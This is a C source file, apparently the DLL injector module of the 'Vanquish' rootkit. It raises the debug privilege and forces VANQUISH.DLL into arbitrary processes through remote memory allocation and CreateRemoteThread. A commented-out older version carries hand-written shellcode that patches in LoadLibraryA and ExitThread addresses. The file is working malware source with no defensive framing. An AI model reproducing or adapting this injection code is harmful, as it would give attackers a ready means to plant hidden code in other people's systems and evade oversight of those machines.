/******************************************************************************\

	Vanquish Injector - Copyright (c)2003 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include "Injector.h"
#include "Utils.h"

extern DECLARE_MODULE(KERNEL32);

//injection mutex
LPCSTR VANQUISH_MUTEX = "VanquishAutoInjectingDLL";

//dll injection debug privilege token size
const DWORD MAX_TOKENPRIVILEGES = 1024;

LPCSTR INJECTOR = "VANQUISH.DLL";
const DWORD INJECTOR_SIZE = 13; //lucky!
LPVOID lpfnLoadLibraryA = NULL;
DWORD dwDebugPrivilege = 0;

///////////////////////////////DEBUG PRIVILEGE//////////////////////////////////

//enable debug privilege
BOOL Vanquish_BeginDebugPrivilege(HANDLE hToken, PTOKEN_PRIVILEGES lptkpNew, PTOKEN_PRIVILEGES lptkpOld)
{
	VBEGIN
	//already debug privilege owner
	if (dwDebugPrivilege == 1) return TRUE;

	LUID luidValue;
	DWORD dwSize;

	DWORD dwCheckPoint = 0;
	char *CheckTable[5] = {
		"GlobalAlloc(OLD)",
		"GlobalAlloc(NEW)",
		"OpenProcessToken",
		"LookupPrivilegeValue"
		"AdjustTokenPrivilege"
	};

	lptkpOld = (PTOKEN_PRIVILEGES)GlobalAlloc(GPTR, MAX_TOKENPRIVILEGES);
	if (!lptkpOld) goto cleanup;
	dwCheckPoint++;

	lptkpOld->PrivilegeCount = 0xffffffff; //for cleanup

	lptkpNew = (PTOKEN_PRIVILEGES)GlobalAlloc(GPTR, MAX_TOKENPRIVILEGES);
	if (!lptkpNew) goto cleanup;
	dwCheckPoint++;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) goto cleanup;
	dwCheckPoint++;

	lptkpNew->PrivilegeCount = 1;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidValue)) goto cleanup;
	dwCheckPoint++;

	lptkpNew->Privileges[0].Luid = luidValue;
	lptkpNew->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, lptkpNew, MAX_TOKENPRIVILEGES, lptkpOld, &dwSize);
	if (GetLastError() != ERROR_SUCCESS) goto cleanup;
	dwCheckPoint++;

	//Vanquish_Dump("DEBUG privilege enabled!");
	dwDebugPrivilege = 1;
	return TRUE;

cleanup:
	//Vanquish_Dump2Log("Vanquish - Cannot enable DEBUG privilege! Reason will follow...");
	//Vanquish_DumpWithErrorCode(CheckTable[dwCheckPoint], GetLastError());
	dwDebugPrivilege = 0;
	VEND
	return FALSE;
}

void Vanquish_EndDebugPrivilege(HANDLE hToken, PTOKEN_PRIVILEGES lptkpOld)
{
	VBEGIN
	dwDebugPrivilege = 0;
	//restore old process privileges
	if (lptkpOld)
	{
		if (lptkpOld->PrivilegeCount != 0xffffffff)
			AdjustTokenPrivileges(hToken, FALSE, lptkpOld, 0, NULL, NULL);
	}
	VEND
}

/////////////////////////////PROCESS INJECTOR///////////////////////////////////

//get address of a module function
LPVOID Vanquish_ModuleFunction(LPCTSTR lpszAPIFunction, HMODULE hModule)
{
	LPVOID ret = NULL;

	VBEGIN
	if (!hModule) return NULL;
	ret = GetProcAddress(hModule, lpszAPIFunction);
	VEND
	return ret;
}

//modify injector shellcode addresses
BOOL Vanquish_PrepareInjector()
{
	VBEGIN
	dwDebugPrivilege = 0;
	lpfnLoadLibraryA = ADDR_OF(LoadLibraryA, KERNEL32);
	if (!lpfnLoadLibraryA)
	{
		Vanquish_Dump2Log("Prepare injector failed! Cannot find address of LoadLibraryA");
		return FALSE;
	}
	VEND
	return TRUE;
}

//inject a dll when we know only the pid
BOOL Vanquish_InjectDLLbyPID(DWORD pid)
{
	BOOL bSuccess = FALSE;

	VBEGIN
	HANDLE hTarget = NULL;

	BEGIN_DEBUGPRIVILEGE

	//open the process
	if ((hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) == NULL)
		goto cleanup;
	
	bSuccess = Vanquish_InjectDLLbyHandle(hTarget);

cleanup:
	//close handle to process
	if (hTarget) CloseHandle(hTarget);

	END_DEBUGPRIVILEGE

	VEND
	return bSuccess;
}

//inject dll when we have PROCESS_ALL_ACCESS handle or similar
//minimum required PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD
BOOL Vanquish_InjectDLLbyHandle(HANDLE hTarget)
{
	if (!hTarget) return FALSE;

	BOOL bSuccess = FALSE;

	VBEGIN
	HANDLE hNew = NULL, myMutex = NULL;
	DWORD dwActual;
	LPVOID lpBase = NULL;
	SECURITY_ATTRIBUTES s;

	DWORD dwCheckPoint = 0;
	char *CheckTable[4] = {
		"VirtualAllocEx",
		"WriteProcessMemory",
		"VerifyWriteProcessMemory",
		"CreateRemoteThread"
	};

	//process sync so that there is only one injection at a time in the system
	myMutex = CreateMutex(NULL, FALSE, VANQUISH_MUTEX);
	WaitForSingleObject(myMutex, INFINITE);

	BEGIN_DEBUGPRIVILEGE

	//allocate space for function - PROCESS_VM_OPERATION
	if ((lpBase = VirtualAllocEx(hTarget, NULL, INJECTOR_SIZE, MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE)) == NULL) goto cleanup;
	dwCheckPoint++;

	//write the injector code - PROCESS_VM_WRITE & PROCESS_VM_OPERATION
	if (!WriteProcessMemory(hTarget, lpBase, (LPVOID)INJECTOR, INJECTOR_SIZE, &dwActual)) goto cleanup;
	dwCheckPoint++;

	//check if we wrote all of the injector code
	if (dwActual != INJECTOR_SIZE) goto cleanup;
	dwCheckPoint++;

	//call the injector - PROCESS_CREATE_THREAD
	//this is the part that **doesn't work** on non-NT boxes
	s.nLength = sizeof(SECURITY_ATTRIBUTES);
	s.lpSecurityDescriptor = NULL;
	s.bInheritHandle = TRUE;
	if ((hNew = CreateRemoteThread(hTarget, &s, 0, (LPTHREAD_START_ROUTINE)lpfnLoadLibraryA, lpBase, 0, &dwActual)) == NULL) goto cleanup;

	bSuccess = TRUE;

cleanup:

	if (!bSuccess)
	{
		dwActual = GetLastError();
		Vanquish_Dump2Log("Vanquish - DLL injection failed! Reason will follow...");
		Vanquish_DumpWithErrorCode(CheckTable[dwCheckPoint], dwActual);
	}

	//free up memory; DOESN'T WORK BECAUSE WE WILL CRASH THE TARGET
	//if (lpBase) VirtualFreeEx(hTarget, lpBase, 0, MEM_RELEASE);

	END_DEBUGPRIVILEGE

	//release the mutex (other injectors cand do their job now!)
	ReleaseMutex(myMutex);
	if (myMutex) CloseHandle(myMutex);
	VEND

	return bSuccess;
}

/********OLD INJECTOR USING SHELLCODE from v0.1 beta2*****************

//BEGIN SHELLCODE: size 48 bytes; made by me
BYTE injector[] = {
	0x55, 0x8b, 0xec, 0xeb, 0x11, 0x5e, 0x8b, 0xc6, 0x83, 0xc0, 0x08, 0x50, 0xff, 0x16, 0x83, 0xc6,
	0x04, 0x33, 0xc0, 0x50, 0xff, 0x16, 0xe8, 0xea, 0xff, 0xff, 0xff,
	0x01, 0x01, 0x01, 0x01, //address of LoadLibraryA 0x77e7d961
	0x02, 0x02, 0x02, 0x02, //address of ExitThread 0x77e74a8f
	"VANQUISH.DLL"
};
const DWORD injector_offset1 = 27; //offset in shellcode of LoadLibraryA address
const DWORD injector_offset2 = 31; //offset in shellcode of ExitThread address
//END SHELLCODE

//modify injector shellcode addresses
BOOL Vanquish_PrepareInjector()
{
	DWORD addr;
	HMODULE k32;

	k32 = GetModuleHandle("KERNEL32.DLL");
	if (k32 == NULL) return FALSE;

	addr = (DWORD)GetProcAddress(k32, "LoadLibraryA");
	if (addr == 0) return FALSE;
	injector[injector_offset1] = (BYTE)(addr & 0xff);
	injector[injector_offset1 + 1] = (BYTE)((addr >> 8) & 0xff);
	injector[injector_offset1 + 2] = (BYTE)((addr >> 16) & 0xff);
	injector[injector_offset1 + 3] = (BYTE)((addr >> 24) & 0xff);

	addr = (DWORD)GetProcAddress(k32, "ExitThread");
	if (addr == 0) return FALSE;
	injector[injector_offset2] = (BYTE)(addr & 0xff);
	injector[injector_offset2 + 1] = (BYTE)((addr >> 8) & 0xff);
	injector[injector_offset2 + 2] = (BYTE)((addr >> 16) & 0xff);
	injector[injector_offset2 + 3] = (BYTE)((addr >> 24) & 0xff);

	return TRUE;
}

void Vanquish_InjectDLLbyPID(DWORD pid)
{
	HANDLE hTarget = NULL;

	//open the process
	if ((hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) != NULL)
		Vanquish_InjectDLLbyHandle(hTarget);

	//close handle to process
	if (hTarget) CloseHandle(hTarget);
}

void Vanquish_InjectDLLbyHandle(HANDLE hTarget)
{
	LUID luidValue;
	PTOKEN_PRIVILEGES lptkpNew = NULL, lptkpOld = NULL;
	HANDLE hToken = NULL, hNew = NULL, myMutex;
	DWORD dwSize, dwActual;
	LPVOID lpBase = NULL;
	SECURITY_ATTRIBUTES s;

	//process sync so that there is only one injection at a time in the system
	myMutex = CreateMutex(NULL, FALSE, "VanquishAutoInjectingDLL");
	WaitForSingleObject(myMutex, INFINITE);

	//enable debug privilege
	lptkpOld = (PTOKEN_PRIVILEGES)GlobalAlloc(GPTR, MAX_TOKENPRIVILEGES);
	if (!lptkpOld) goto cleanup;
	lptkpOld->PrivilegeCount = 0xffffffff; //for cleanup
	lptkpNew = (PTOKEN_PRIVILEGES)GlobalAlloc(GPTR, MAX_TOKENPRIVILEGES);
	if (!lptkpNew) goto cleanup;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) goto cleanup;
	lptkpNew->PrivilegeCount = 1;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidValue)) goto cleanup;
	lptkpNew->Privileges[0].Luid = luidValue;
	lptkpNew->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, lptkpNew, 1024, lptkpOld, &dwSize);
	if (GetLastError() != ERROR_SUCCESS) goto cleanup;

	//allocate space for function - PROCESS_VM_OPERATION
	dwSize = sizeof(injector);
	if ((lpBase = VirtualAllocEx(hTarget, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL) goto cleanup;

	//write the injector code - PROCESS_VM_WRITE & PROCESS_VM_OPERATION
	if (!WriteProcessMemory(hTarget, lpBase, injector, dwSize, &dwActual)) goto cleanup;

	//check if we wrote all of the injector code
	if (dwActual != dwSize) goto cleanup;

	//call the injector - PROCESS_CREATE_THREAD
	//this is the part that **doesn't work** on non-NT boxes
	s.nLength = sizeof(SECURITY_ATTRIBUTES);
	s.lpSecurityDescriptor = NULL;
	s.bInheritHandle = FALSE;
	if ((hNew = CreateRemoteThread(hTarget, &s, 0, (LPTHREAD_START_ROUTINE)lpBase, NULL, 0, &dwActual)) == NULL) goto cleanup;

cleanup:


	//restore old process privileges
	if (lptkpOld)
	{
		if (lptkpOld->PrivilegeCount != 0xffffffff)
			AdjustTokenPrivileges(hToken, FALSE, lptkpOld, 0, NULL, NULL);
	}

	//release the mutex (other injectors cand do their job now!)
	ReleaseMutex(myMutex);
	if (myMutex) CloseHandle(myMutex);
	return;
}
*****************************************************/
